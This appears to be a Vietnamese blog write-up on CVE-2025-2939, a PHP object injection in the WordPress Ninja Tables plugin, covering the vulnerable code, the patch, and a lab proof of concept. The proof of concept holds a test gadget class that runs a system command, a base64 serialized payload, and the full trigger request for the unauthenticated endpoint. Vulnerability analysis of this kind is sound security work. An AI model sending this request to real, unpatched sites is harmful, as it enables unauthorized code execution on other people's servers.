# CVE-2025-2939 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin Ninja Tables – Easy Data Table Builder của WordPress tồn tại lỗ hổng **PHP Object Injection** trong tất cả các phiên bản đến 5.0.18, do việc giải tuần tự (deserialization) dữ liệu không tin cậy từ tham số `args[callback]`. Lỗ hổng này cho phép kẻ tấn công chưa xác thực chèn một đối tượng PHP độc hại.

* **CVE ID**: [CVE-2025-2939](https://www.cve.org/CVERecord?id=CVE-2025-2939)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 5.0.18
* **Patched Versions**: 5.0.19
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Ninja Tables – Easy Data Table Builder Plugin](https://wordpress.org/plugins/ninja-tables/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Ninja Tables – Easy Data Table Builder**:  
    * `5.0.18` – **vulnerable**  
    * `5.0.19` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
**Trong phiên bản lỗi (v5.0.18):**

```php {title="preserve-code-formatting.php v5.0.18"}
$callback = unserialize(base64_decode($params['callback']));
```

Trong đoạn mã này, hàm **`unserialize()`** được gọi trực tiếp trên dữ liệu người dùng (`$params['callback']` sau khi giải mã base64). Điều này tạo ra lỗ hổng nghiêm trọng:

- **Nguy cơ Object Injection**: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến **Object Injection** và có khả năng tiến tới **Remote Code Execution (RCE)**.  
- **Thiếu kiểm tra an toàn**: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.  
- **Không có cơ chế fallback**: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.  

**Bản vá (v5.0.19):** 

![Diff](diff.png "Sự thay đổi của bản vá")

Thay thế `unserialize()` bằng `json_decode()`:

Không còn dùng `unserialize()` → loại bỏ hoàn toàn khả năng `PHP Object Injection`.

## Analysis
`getCallback()` được gọi trong hàm `registerAsyncRequestHandler()`

```php {data-open=true title="Client.php" hl_lines=[3,5,19]}
public static function registerAsyncRequestHandler()
{
    $action = static::makeAsyncRequestAction();

    App::addAction("admin_post_nopriv_{$action}", function() {
        
        $request = App::make('request');
        
        $requestUrl = $request->get('args.url');
        
        $requestMethod = $request->get('args.method');
        
        $client = Client::make($requestUrl);
        
        $params = $request->except(
            'action', 'args.url', 'args.method',
        )['args'];

        $callback = static::getCallback($params);
        ...
    });
}
```

Hàm đăng ký một Ajax endpoint cho người dùng chưa xác thực (`admin_post_nopriv_`) với `action` được lấy từ `makeAsyncRequestAction()`:

```php
protected static function makeAsyncRequestAction()
{
    return 'wpf-async-request-'.sha1(
        App::config()->get('app.slug')
    );
}
```

Giá trị trả về là chuỗi `"wpf-async-request-"` nối với `sha1()` của `app.slug`. Biết slug của plugin là `ninja-tables`, giá trị cuối cùng sẽ là:

```
wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77
```

`$params` là toàn bộ dữ liệu trong `args[...]` của request, sau khi bỏ đi các thông tin điều khiển (`action`, `args.url`, `args.method`)

=> Khi gửi request tới endpoint `/wp-admin/admin-post.php` với `action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77` thì `getCallback($params)` sẽ được gọi.

## Flow

{{< mermaid >}}
graph TD

A["Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&args[callback]=base64_payload"]
    --> B["WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77"]

B --> C["Plugin handler calls getCallback($params)"]
C --> D["Decode base64 and unserialize payload"]
D --> E["Malicious object instantiated → RCE"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo class để test đặt trong `wp-config.php`
```php
class Evil
{
    public $command = "ls /";
    public function __destruct()
    {
        die(system($this->command));
    }
}
```
2. Cho request đi qua proxy của BurpSuite
3. Gửi lại request với args[callback] chứa chuỗi serialized được encode base64

```php
args[callback] = base64_encode('O:4:"Evil":1:{s:7:"command";s:4:"ls /";}')
```

```HTTP
GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1
Host: localhost
```

![Result](result.png "Kết quả")

# Conclusion
Các phiên bản <= 5.0.18 của plugin Ninja Tables xử lý tham số `args[callback]` không an toàn, dẫn đến việc thực thi `unserialize()` trên dữ liệu người dùng mà không có bất kỳ bước xác thực nào. Điều này cho phép kẻ tấn công chưa xác thực đưa vào payload chứa object độc hại và thực thi mã trên server. Bản cập nhật 5.0.19 loại bỏ hoàn toàn việc sử dụng `unserialize()` và thay thế bằng `json_decode`, giải quyết triệt để lỗ hổng.

# Key Takeaways
- `unserialize()` không được phép dùng cho dữ liệu nhận từ client nếu không có xác thực.
- Ajax hook `admin_post_nopriv_*` mở bề mặt tấn công cho người dùng chưa đăng nhập.
- Chỉ cần một request HTTP là có thể kích hoạt khai thác.
- Bản vá 5.0.19 xử lý đúng hướng bằng cách chuyển sang định dạng an toàn hơn như JSON.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress Ninja Tables – Easy Data Table Builder Plugin <= 5.0.18 is vulnerable to a high priority PHP Object Injection](https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-php-object-injection-to-limited-remote-code-execution-vulnerability)     


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-21-cve-2025-2939/  

